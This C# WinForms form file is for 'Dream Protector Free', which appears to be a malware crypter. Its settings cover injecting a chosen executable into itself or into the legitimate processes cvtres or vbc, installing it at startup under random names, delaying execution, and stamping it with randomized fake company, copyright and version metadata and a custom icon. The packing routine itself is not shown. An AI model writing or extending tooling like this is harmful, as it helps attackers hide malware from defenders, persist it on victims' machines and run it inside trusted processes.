using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Dream_Protector_Free
{
    public partial class Form1 : Form
    {
        private Logger logger = new Logger();
        
        public Form1()
        {
            logger.OnLog += logger_OnLog;
            InitializeComponent();
            //logger.LogInformation("Buy Dream Protector Advanced!");
            RandomizeAssembly();
            RandomizeInstall();
           // logger.LogSuccess("Thank you for choosing to Dream with us!");
        }

        private void logger_OnLog(DateTime date, byte kind, string message)
        {

            if (nativeListView1.InvokeRequired)
            {
                nativeListView1.Invoke(new MethodInvoker(() => { logger_OnLog(date, kind, message); }));
                return;
            }

            ListViewItem item = new ListViewItem(new string[] { date.ToShortTimeString(), message });
            item.ImageIndex = kind;

            nativeListView1.Items.Add(item);

           // throw new NotImplementedException();
        }

        private DreamSettings GetSettings()
        {
            DreamSettings ds = new DreamSettings();

            ds.FileName = inputFileText.Text;

            ds.Install = installCheck.Checked;
            ds.InstallName = startupNameText.Text;
            ds.ProcessName = processNameText.Text;

            ds.InjectionTarget = itselfRadio.Checked ? "itself" : cvtresRadio.Checked ? "cvtres" : "vbc";

            ds.Delay = delayCheck.Checked;
            ds.DelaySeconds = (int)delayNum.Value;

            ds.AssemblyDescription = asmDescriptionText.Text;
            ds.AssemblyProductName = asmProductNameText.Text;
            ds.AssemblyCompany = asmCompanyText.Text;
            ds.AssemblyCopyright = asmCopyrightText.Text;
            ds.AssemblyVersion = asmVersionText.Text;

            ds.IconPath = iconText.Text;

            return ds;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using(OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Application (.exe)|*.exe";
                if(ofd.ShowDialog() == DialogResult.OK)
                {
                    inputFileText.Text = ofd.FileName;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using(SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.Filter = "Application (.exe)|*.exe";
                sfd.FileName = string.Format("{0}.exe", WordGen.GenWord(1));
                if (sfd.ShowDialog() == DialogResult.OK)
                {
                    new Thread(new ThreadStart(() => {
                        Protector p = new Protector(logger);
                        bool success = p.Protect(GetSettings(), sfd.FileName);
                        
                    })).Start();
                    
                }
            }
            
        }

        private void button3_Click(object sender, EventArgs e)
        {
            RandomizeInstall();
        }

        private void RandomizeInstall()
        {
            startupNameText.Text = WordGen.GenWord(5);
            processNameText.Text = string.Format("{0}.exe", WordGen.GenWord(2));
        }

        private void RandomizeAssembly()
        {
            asmDescriptionText.Text = WordGen.GenWord(10);
            asmProductNameText.Text = string.Format("{0}", WordGen.GenWord(2));
            asmCopyrightText.Text = string.Format("{0} © {1}", WordGen.GenWord(2), WordGen.GenWord(2));
            asmCompanyText.Text = WordGen.GenWord(5);
            asmVersionText.Text = string.Format("{0}.{1}.{2}.{3}", WordGen.R.Next(1, 20), WordGen.R.Next(0, 30), WordGen.R.Next(0, 99), WordGen.R.Next(0, 99));
        }

        private void button5_Click(object sender, EventArgs e)
        {
            RandomizeAssembly();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            using(OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon (.ico)|*.ico";
                if(ofd.ShowDialog() == DialogResult.OK)
                {
                    iconText.Text = ofd.FileName;
                    pictureBox1.ImageLocation = ofd.FileName;
                }
            }
        }
    }
}
